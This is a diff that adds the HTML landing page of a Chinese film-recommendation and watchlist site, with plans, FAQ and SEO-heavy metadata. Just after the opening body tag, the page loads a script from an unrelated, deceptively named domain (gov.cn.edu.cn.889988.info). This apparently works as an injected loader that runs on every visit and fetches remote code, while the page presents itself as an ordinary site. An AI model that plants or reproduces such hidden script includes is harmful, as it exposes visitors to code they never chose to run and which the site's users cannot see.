@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>私人影视 | 专属你的私人片库 · 个性化影视推荐与高清资源导航平台</title>
+<meta name="keywords" content="私人影视,私人片库,个性化影视推荐,我的观影清单,高清影视资源,影视导航,定制观影,电影收藏,追剧助手,私人影院">
+<meta name="description" content="私人影视（sirenyingshi-app.github.io）是一个专注个性化影视服务的在线平台，帮你建立专属私人片库。从私人定制推荐、观影清单管理到高清资源导航，覆盖电影、剧集、综艺、动漫全品类，让每一次选择都精准贴合你的口味。打造只属于你的影视空间。">
+<meta name="author" content="私人影视">
+<meta name="copyright" content="Copyright © 私人影视 保留所有权利">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#f4f7fb">
+<link rel="canonical" href="https://sirenyingshi-app.github.io/">
+<style>
+:root{
+  --bg:#f4f7fb;--card:#ffffff;--ink:#1c2333;--sub:#5b6478;--brand:#2dd4bf;--brand2:#6366f1;
+  --warm:#f59e0b;--line:#e6ebf3;--shadow:0 8px 30px rgba(28,35,51,.07);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+}
+.wrap{max-width:1120px;margin:0 auto;padding:0 24px}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+img{max-width:100%}
+/* topbar */
+.topbar{background:linear-gradient(100deg,#1e1b4b,#312e81 55%,#0e7490);color:#fff;padding:8px 0;font-size:13px}
+.topbar .wrap{display:flex;justify-content:space-between;align-items:center}
+.topbar .tleft{opacity:.9}
+.topbar .tright a{margin-left:18px;opacity:.85;transition:.2s}
+.topbar .tright a:hover{opacity:1;color:#5eead4}
+/* header */
+header{background:var(--card);box-shadow:var(--shadow);position:sticky;top:0;z-index:99}
+.hd{display:flex;align-items:center;justify-content:space-between;height:74px}
+.brand-logo{display:flex;align-items:center;gap:12px}
+.brand-logo .mark{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:grid;place-items:center;font-size:22px;box-shadow:0 4px 14px rgba(99,102,241,.35)}
+.brand-logo b{font-size:22px;letter-spacing:.5px;background:linear-gradient(90deg,#1e1b4b,#0e7490);-webkit-background-clip:text;background-clip:text;color:transparent}
+.menu{display:flex;gap:4px;align-items:center}
+.menu a{padding:9px 18px;border-radius:10px;font-size:15px;font-weight:500;color:var(--sub);transition:.2s}
+.menu a:hover{background:linear-gradient(135deg,rgba(45,212,191,.12),rgba(99,102,241,.12));color:#1e1b4b}
+.hamburger{display:none;width:40px;height:40px;border:0;background:var(--bg);border-radius:10px;font-size:20px;color:#1e1b4b;cursor:pointer}
+/* hero */
+.hero{position:relative;overflow:hidden;padding:96px 0 80px;background:
+  radial-gradient(circle at 88% 12%,rgba(245,158,11,.22),transparent 38%),
+  radial-gradient(circle at 8% 88%,rgba(99,102,241,.18),transparent 40%),
+  linear-gradient(135deg,#eef2ff,#ecfeff);
+}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:60px;align-items:center}
+.hero h1{font-size:clamp(30px,4.6vw,54px);font-weight:900;line-height:1.2;letter-spacing:-.5px}
+.hero h1 .hl{background:linear-gradient(120deg,var(--brand2),var(--brand));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .sub{color:var(--sub);font-size:clamp(15px,1.6vw,18px);margin:22px 0 30px;max-width:520px}
+.search{display:flex;background:#fff;padding:8px;border-radius:16px;box-shadow:var(--shadow);max-width:520px}
+.search input{flex:1;border:0;outline:0;padding:12px 16px;font-size:15px;background:transparent}
+.search button{border:0;background:linear-gradient(135deg,var(--brand2),var(--brand));color:#fff;padding:0 28px;border-radius:11px;font-size:15px;font-weight:700;cursor:pointer;transition:.25s}
+.search button:hover{transform:scale(1.03)}
+.hero-tags{display:flex;gap:10px;flex-wrap:wrap;margin-top:26px}
+.hero-tags span{background:#fff;border:1px solid var(--line);padding:6px 14px;border-radius:20px;font-size:13px;color:var(--sub)}
+.hero-tags span s{text-decoration:none;color:var(--brand2);font-weight:700}
+.phone{background:#1e1b4b;border-radius:36px;padding:14px;box-shadow:0 30px 70px rgba(30,27,75,.35);transform:rotate(-2deg)}
+.phone-screen{background:#0f172a;border-radius:24px;padding:22px;color:#e2e8f0}
+.phone-screen .bar{height:10px;border-radius:6px;background:rgba(255,255,255,.1);margin-bottom:14px}
+.phone-screen .row{display:flex;gap:10px;margin-bottom:12px}
+.phone-screen .thumb{width:74px;height:98px;border-radius:8px;background:linear-gradient(135deg,rgba(99,102,241,.5),rgba(45,212,191,.4))}
+.phone-screen .thumb.g{background:linear-gradient(135deg,rgba(245,158,11,.5),rgba(244,63,94,.4))}
+.phone-screen .thumb.p{background:linear-gradient(135deg,rgba(16,185,129,.5),rgba(45,212,191,.4))}
+.phone-screen .line{height:8px;border-radius:5px;background:rgba(255,255,255,.08);margin:8px 0}
+.phone-screen .line.w70{width:70%}
+.phone-screen .chip{display:inline-block;background:rgba(45,212,191,.15);color:#5eead4;font-size:11px;padding:3px 10px;border-radius:20px;margin:4px 6px 0 0}
+/* section */
+section{padding:82px 0}
+.kicker{display:inline-flex;align-items:center;gap:8px;font-size:13px;font-weight:700;letter-spacing:1px;color:var(--brand2);text-transform:uppercase;margin-bottom:12px}
+.kicker::before{content:"";width:26px;height:2px;background:var(--brand)}
+h2.sec{font-size:clamp(24px,3.4vw,38px);font-weight:900;line-height:1.3}
+h2.sec em{font-style:normal;color:var(--brand);background:linear-gradient(90deg,var(--brand),var(--brand2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.sec-sub{color:var(--sub);margin-top:10px;font-size:16px;max-width:600px}
+.center{text-align:center}
+.center .kicker{justify-content:center}
+.center .kicker::after{content:"";width:26px;height:2px;background:var(--brand)}
+/* feature cards */
+.features{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.feat{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:34px 30px;transition:.3s;position:relative;overflow:hidden}
+.feat::after{content:"";position:absolute;left:0;top:0;width:100%;height:4px;background:linear-gradient(90deg,var(--brand),var(--brand2))}
+.feat:hover{transform:translateY(-8px);box-shadow:0 20px 44px rgba(28,35,51,.12)}
+.feat .num{font-size:13px;font-weight:800;color:var(--brand);letter-spacing:1px}
+.feat h3{font-size:20px;margin:12px 0 10px}
+.feat p{color:var(--sub);font-size:14.5px}
+.feat .arrow{margin-top:18px;color:var(--brand2);font-weight:700;font-size:14px}
+/* categories chips */
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.cat{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px;text-align:center;transition:.25s}
+.cat:hover{border-color:var(--brand);background:linear-gradient(160deg,#fff,#ecfeff)}
+.cat .big{font-size:42px;display:block;margin-bottom:12px}
+.cat h4{font-size:17px;margin-bottom:6px}
+.cat p{color:var(--sub);font-size:13.5px}
+/* timeline */
+.timeline{position:relative;margin-top:40px;padding-left:40px}
+.timeline::before{content:"";position:absolute;left:12px;top:6px;bottom:6px;width:3px;background:linear-gradient(180deg,var(--brand),var(--brand2),var(--warm))}
+.tl-item{position:relative;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:24px 26px;margin-bottom:18px}
+.tl-item::before{content:"";position:absolute;left:-34px;top:28px;width:16px;height:16px;border-radius:50%;background:#fff;border:4px solid var(--brand2)}
+.tl-item h4{font-size:18px;margin-bottom:8px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.tl-item h4 .lv{font-size:12px;background:linear-gradient(135deg,var(--warm),#f43f5e);color:#fff;padding:3px 12px;border-radius:20px;font-weight:700}
+.tl-item p{color:var(--sub);font-size:14.5px}
+/* pricing */
+.plans{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;margin-top:20px}
+.plan{background:var(--card);border:1px solid var(--line);border-radius:22px;padding:38px 30px;transition:.3s;display:flex;flex-direction:column}
+.plan.pop{border:2px solid transparent;background:linear-gradient(#fff,#fff) padding-box,linear-gradient(135deg,var(--brand),var(--brand2)) border-box;transform:scale(1.04)}
+.plan h4{font-size:15px;color:var(--sub);text-transform:uppercase;letter-spacing:1px}
+.plan .price{font-size:42px;font-weight:900;margin:12px 0 4px}
+.plan .price small{font-size:15px;font-weight:500;color:var(--sub)}
+.plan .desc{color:var(--sub);font-size:14px;margin-bottom:22px}
+.plan ul{margin-bottom:28px;flex:1}
+.plan li{padding:7px 0;font-size:14.5px;display:flex;gap:8px}
+.plan li::before{content:"✓";color:var(--brand);font-weight:800}
+.plan a{text-align:center;padding:13px;border-radius:12px;font-weight:700;background:var(--bg);color:var(--ink);transition:.25s}
+.plan.pop a{background:linear-gradient(135deg,var(--brand2),var(--brand));color:#fff}
+.plan a:hover{letter-spacing:1px}
+/* faq */
+.faq{display:grid;gap:14px;max-width:860px;margin:0 auto}
+.faq-item{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px 24px;transition:.2s}
+.faq-item:hover{border-color:var(--brand)}
+.faq-item .q{font-weight:700;font-size:16px;display:flex;justify-content:space-between;gap:12px}
+.faq-item .q span{color:var(--brand2);font-size:20px}
+.faq-item .a{color:var(--sub);font-size:14.5px;margin-top:10px;padding-top:12px;border-top:1px dashed var(--line)}
+/* cta */
+.cta{background:linear-gradient(120deg,#1e1b4b,#0e7490);border-radius:28px;padding:56px 40px;text-align:center;color:#fff;position:relative;overflow:hidden}
+.cta::after{content:"🎞️";position:absolute;right:-20px;bottom:-30px;font-size:160px;opacity:.12}
+.cta h2{font-size:clamp(24px,3.4vw,38px);font-weight:900;margin-bottom:14px}
+.cta p{opacity:.85;margin-bottom:28px}
+.cta-btn{display:inline-block;background:var(--warm);color:#1e1b4b;padding:15px 42px;border-radius:14px;font-weight:800;font-size:16px;transition:.25s}
+.cta-btn:hover{transform:translateY(-3px);box-shadow:0 14px 34px rgba(245,158,11,.5)}
+/* footer */
+footer{background:#0f172a;color:#94a3b8;padding:64px 0 30px}
+.ft{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.ft .b b{font-size:20px;color:#fff}
+.ft .b p{font-size:14px;margin-top:12px;line-height:1.8}
+.ft h5{color:#fff;font-size:15px;margin-bottom:16px}
+.ft ul li{padding:6px 0;font-size:14px}
+.ft ul li a:hover{color:#5eead4}
+.ft-bot{border-top:1px solid rgba(255,255,255,.08);padding-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:13px}
+.ft-bot a{color:#94a3b8}
+.ft-bot a:hover{color:#5eead4}
+.ft-bot .site{color:#5eead4}
+/* responsive */
+@media(max-width:920px){
+  .features,.cats{grid-template-columns:repeat(2,1fr)}
+  .plans{grid-template-columns:1fr;max-width:440px;margin:20px auto 0}
+  .plan.pop{transform:none}
+  .hero-grid{grid-template-columns:1fr;gap:40px}
+  .phone{display:none}
+  .ft{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  section{padding:56px 0}
+  .hero{padding:60px 0}
+  .menu{display:none;position:absolute;top:74px;left:0;right:0;flex-direction:column;background:#fff;padding:16px;box-shadow:var(--shadow)}
+  .menu.open{display:flex}
+  .menu a{width:100%;text-align:center;padding:13px}
+  .hamburger{display:block}
+  .features,.cats{grid-template-columns:1fr}
+  .timeline{padding-left:30px}
+  .timeline::before{left:8px}
+  .tl-item::before{left:-26px;width:12px;height:12px}
+  .ft{grid-template-columns:1fr}
+  .topbar .tleft{display:none}
+  .wrap{padding:0 18px}
+  .cta{padding:40px 22px;border-radius:20px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <div class="tleft">📬 每日精选片单已更新 · 开启你的专属观影之旅</div>
+    <div class="tright"><a href="#">登录</a><a href="#">注册</a><a href="#">APP下载</a></div>
+  </div>
+</div>
+
+<header>
+  <div class="wrap hd">
+    <a class="brand-logo" href="https://sirenyingshi-app.github.io/">
+      <span class="mark">🎞️</span><b>私人影视</b>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#library">私人片库</a>
+      <a href="#cats">内容分类</a>
+      <a href="#guide">搭建指南</a>
+      <a href="#plans">会员服务</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <button class="hamburger" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+  </div>
+</header>
+
+<main>
+
+<section class="hero" id="home">
+  <div class="wrap hero-grid">
+    <div>
+      <h1>建立你的<span class="hl">私人影视</span>空间<br>每一部片都懂你</h1>
+      <p class="sub">私人影视（sirenyingshi-app.github.io）帮你把散落的观影喜好整理成一座专属片库。个性化推荐、清单管理、高清资源导航三位一体，让找片不再浪费时间。</p>
+      <form class="search" onsubmit="event.preventDefault()">
+        <input type="text" placeholder="搜索你想看的电影、剧集、演员或片单…">
+        <button type="submit">开始探索</button>
+      </form>
+      <div class="hero-tags">
+        <span>今日热门：<s>悬疑新剧</s></span>
+        <span>片单推荐：<s>周末治愈</s></span>
+        <span>经典回顾：<s>90年代港片</s></span>
+        <span>题材：<s>科幻 · 爱情 · 纪录</s></span>
+      </div>
+    </div>
+    <div class="phone">
+      <div class="phone-screen">
+        <div class="bar"></div>
+        <div class="row">
+          <div class="thumb"></div><div class="thumb g"></div><div class="thumb p"></div><div class="thumb"></div>
+        </div>
+        <div class="line"></div><div class="line w70"></div>
+        <div class="chip">我的片单 · 想看</div><div class="chip">正在追</div><div class="chip">已收藏</div>
+        <div class="line" style="margin-top:16px"></div><div class="line w70"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="library">
+  <div class="wrap">
+    <div class="kicker">Core Features</div>
+    <h2 class="sec">为什么选择<b>私人影视</b>？</h2>
+    <p class="sec-sub">不只是影视导航，更是一套围绕"你"运转的观影系统。</p>
+    <div class="features" style="margin-top:46px">
+      <div class="feat">
+        <div class="num">01 / PERSONAL</div>
+        <h3>私人定制推荐</h3>
+        <p>基于你的观影记录与偏好标签，智能匹配相似题材与同类型佳作，越用越懂你，告别千篇一律的榜单。</p>
+        <div class="arrow">查看推荐逻辑 →</div>
+      </div>
+      <div class="feat">
+        <div class="num">02 / LIBRARY</div>
+        <h3>专属片库管理</h3>
+        <p>想看、在追、已看、收藏四大清单自由分类，支持打分与短评，把每一次观影都留下痕迹。</p>
+        <div class="arrow">管理我的片库 →</div>
+      </div>
+      <div class="feat">
+        <div class="num">03 / SOURCE</div>
+        <h3>高清资源导航</h3>
+        <p>聚合多源影视资源入口，覆盖 1080P、4K、HDR 多种画质，按类型、年份、评分快速筛选定位。</p>
+        <div class="arrow">浏览资源库 →</div>
+      </div>
+      <div class="feat">
+        <div class="num">04 / SYNC</div>
+        <h3>多端同步</h3>
+        <p>手机、平板、电脑、电视全端自适应，观影进度与片单实时同步，换设备接着看不中断。</p>
+        <div class="arrow">了解多端体验 →</div>
+      </div>
+      <div class="feat">
+        <div class="num">05 / TOPIC</div>
+        <h3>主题片单策划</h3>
+        <p>编辑团队定期产出主题片单：周末治愈、深夜悬疑、经典回顾、冷门佳片，一键收藏整套。</p>
+        <div class="arrow">发现主题片单 →</div>
+      </div>
+      <div class="feat">
+        <div class="num">06 / COMMUNITY</div>
+        <h3>同好交流圈</h3>
+        <p>找到口味相近的影迷，分享观影心得，发现更多被埋没的好作品，让观影不再孤独。</p>
+        <div class="arrow">加入交流圈 →</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="cats" style="background:#fff">
+  <div class="wrap center">
+    <div class="kicker" style="justify-content:center"><span style="display:inline-block;width:26px;height:2px;background:var(--brand)"></span> Categories</div>
+    <h2 class="sec">覆盖<b>全品类</b>影视内容</h2>
+    <p class="sec-sub" style="margin:10px auto 0">从院线大片到小众佳作，从经典老片到当季新番，一应俱全</p>
+    <div class="cats" style="margin-top:50px">
+      <div class="cat"><span class="big">🎬</span><h4>电影</h4><p>院线新片 / 经典老片 / 独立电影</p></div>
+      <div class="cat"><span class="big">📺</span><h4>剧集</h4><p>国产 / 美剧 / 韩剧 / 日剧</p></div>
+      <div class="cat"><span class="big">🎤</span><h4>综艺</h4><p>真人秀 / 脱口秀 / 选秀综艺</p></div>
+      <div class="cat"><span class="big">🌟</span><h4>动漫</h4><p>日漫 / 国漫 / 动画电影</p></div>
+      <div class="cat"><span class="big">🐳</span><h4>纪录片</h4><p>自然 / 历史 / 人文 / 科技</p></div>
+      <div class="cat"><span class="big">🎭</span><h4>短片</h4><p>微电影 / 独立短片 / 实验影像</p></div>
+      <div class="cat"><span class="big">🏆</span><h4>榜单</h4><p>高分排行 / 获奖作品 / 冷门佳片</p></div>
+      <div class="cat"><span class="big">🗂️</span><h4>专题</h4><p>导演合集 / 演员作品 / 系列合集</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="guide">
+  <div class="wrap">
+    <div class="kicker">How to Build</div>
+    <h2 class="sec">三步搭建你的<b>私人影视</b>体系</h2>
+    <p class="sec-sub">从零开始，把零散的观影习惯变成一套可复用的私人体系。</p>
+    <div class="timeline">
+      <div class="tl-item">
+        <h4>梳理观影偏好 <span class="lv">STEP 1</span></h4>
+        <p>先明确自己常看的题材、喜欢的导演与演员、偏好的年代与地区，建立基础标签库，为后续精准推荐打底。</p>
+      </div>
+      <div class="tl-item">
+        <h4>搭建分类片单 <span class="lv">STEP 2</span></h4>
+        <p>按"想看 / 在追 / 已看 / 收藏"建立四大清单，再按类型、年份、评分分层管理，让片库井井有条。</p>
+      </div>
+      <div class="tl-item">
+        <h4>建立更新节奏 <span class="lv">STEP 3</span></h4>
+        <p>订阅每周新片提醒与主题片单推送，固定时间补充片单、清理已看，让私人片库持续生长。</p>
+      </div>
+      <div class="tl-item">
+        <h4>沉淀观影记录 <span class="lv">STEP 4</span></h4>
+        <p>为每部作品打分写短评，积累个人观影档案，长期下来就能看到自己口味的变化轨迹。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="plans" style="background:#fff">
+  <div class="wrap center">
+    <div class="kicker" style="justify-content:center"><span style="display:inline-block;width:26px;height:2px;background:var(--brand)"></span> Membership</div>
+    <h2 class="sec">选择适合的<b>会员方案</b></h2>
+    <p class="sec-sub" style="margin:10px auto 0">免费起步，按需升级，灵活选择</p>
+    <div class="plans">
+      <div class="plan">
+        <h4>免费版</h4>
+        <div class="price">¥0<small> / 永久</small></div>
+        <p class="desc">适合刚起步建立片库的影迷</p>
+        <ul>
+          <li>基础片单管理</li>
+          <li>每日热门推荐</li>
+          <li>1080P 资源导航</li>
+          <li>网页端访问</li>
+        </ul>
+        <a href="#">免费开始</a>
+      </div>
+      <div class="plan pop">
+        <h4>标准会员</h4>
+        <div class="price">¥19<small> / 月</small></div>
+        <p class="desc">解锁更懂你的个性化体验</p>
+        <ul>
+          <li>AI 智能推荐引擎</li>
+          <li>4K 高清资源导航</li>
+          <li>多端同步与进度记录</li>
+          <li>主题片单优先获取</li>
+          <li>专属观影档案</li>
+        </ul>
+        <a href="#">立即开通</a>
+      </div>
+      <div class="plan">
+        <h4>家庭共享</h4>
+        <div class="price">¥39<small> / 月</small></div>
+        <p class="desc">最多 5 人共享，各自独立的片库</p>
+        <ul>
+          <li>含标准会员全部权益</li>
+          <li>5 个子账号独立片单</li>
+          <li>家庭主题片单推荐</li>
+          <li>专属客服通道</li>
+        </ul>
+        <a href="#">了解详情</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="faq">
+  <div class="wrap center">
+    <div class="kicker" style="justify-content:center"><span style="display:inline-block;width:26px;height:2px;background:var(--brand)"></span> FAQ</div>
+    <h2 class="sec">常见问题<b>解答</b></h2>
+    <div class="faq" style="margin-top:44px;text-align:left">
+      <div class="faq-item"><div class="q">私人影视主要提供哪些服务？<span>＋</span></div><div class="a">我们提供个性化影视推荐、私人片库管理、高清资源导航、主题片单策划及影迷交流等服务，帮助你更高效地发现和整理影视内容。</div></div>
+      <div class="faq-item"><div class="q">片单数据会丢失吗？<span>＋</span></div><div class="a">所有片单与观影记录均实时云端同步，登录同一账号即可在任何设备上恢复，无需担心更换设备导致数据丢失。</div></div>
+      <div class="faq-item"><div class="q">免费版和会员版有什么区别？<span>＋</span></div><div class="a">免费版提供基础片单管理与热门推荐；会员版解锁 AI 智能推荐、4K 资源导航、多端同步与观影档案等进阶功能。</div></div>
+      <div class="faq-item"><div class="q">支持哪些设备访问？<span>＋</span></div><div class="a">本站采用全响应式设计，手机、平板、电脑、智能电视浏览器均可流畅访问，界面自动适配屏幕尺寸。</div></div>
+      <div class="faq-item"><div class="q">如何提交建议或反馈问题？<span>＋</span></div><div class="a">可通过页面底部联系方式提交反馈，也可加入官方交流圈与编辑团队直接沟通，我们会认真对待每一条建议。</div></div>
+    </div>
+  </div>
+</section>
+
+<section style="padding-top:0">
+  <div class="wrap">
+    <div class="cta">
+      <h2>现在就开启你的私人影视之旅</h2>
+      <p>让每一部作品都被认真记录，让每一次选择都更贴近心意。</p>
+      <a class="cta-btn" href="#home">免费建立我的片库</a>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="b">
+        <b>🎞️ 私人影视</b>
+        <p>私人影视（sirenyingshi-app.github.io）致力于帮助用户建立专属的影视管理与发现体系，让好作品不被错过，让观影成为一件有迹可循的事。</p>
+      </div>
+      <div><h5>核心功能</h5><ul><li><a href="#">私人片库</a></li><li><a href="#">智能推荐</a></li><li><a href="#">主题片单</a></li><li><a href="#">观影档案</a></li></ul></div>
+      <div><h5>内容分类</h5><ul><li><a href="#">电影</a></li><li><a href="#">剧集</a></li><li><a href="#">综艺</a></li><li><a href="#">动漫 / 纪录片</a></li></ul></div>
+      <div><h5>关于我们</h5><ul><li><a href="#">网站简介</a></li><li><a href="#">会员服务</a></li><li><a href="#">合作投稿</a></li><li><a href="#">联系反馈</a></li></ul></div>
+    </div>
+    <div class="ft-bot">
+      <div>本站网址：<span class="site">https://sirenyingshi-app.github.io/</span> ｜ 网站名称：私人影视</div>
+      <div>Copyright © 私人影视 保留所有权利 ｜ <a href="https://sirenyingshi-app.github.io/">sirenyingshi-app.github.io</a></div>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var t=document.querySelector(this.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('menu').classList.remove('open');}
+  });
+});
+document.querySelectorAll('.faq-item').forEach(function(item){
+  item.addEventListener('click',function(){
+    var ans=this.querySelector('.a');
+    var s=this.querySelector('.q span');
+    var open=ans.style.display==='block';
+    document.querySelectorAll('.faq-item .a').forEach(function(x){x.style.display='';});
+    document.querySelectorAll('.faq-item .q span').forEach(function(x){x.textContent='＋';});
+    if(!open){ans.style.display='block';s.textContent='－';}
+  });
+});
+</script>
+</body>
+</html>
